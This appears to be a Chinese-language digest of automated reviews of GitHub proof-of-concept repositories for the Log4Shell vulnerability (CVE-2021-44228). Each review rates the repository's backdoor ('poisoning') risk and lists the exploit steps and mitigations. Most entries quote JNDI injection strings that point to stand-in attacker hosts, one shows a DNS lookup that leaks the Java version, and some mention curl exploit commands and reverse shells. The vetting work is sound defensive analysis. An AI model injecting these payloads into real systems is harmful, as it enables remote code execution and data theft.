**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

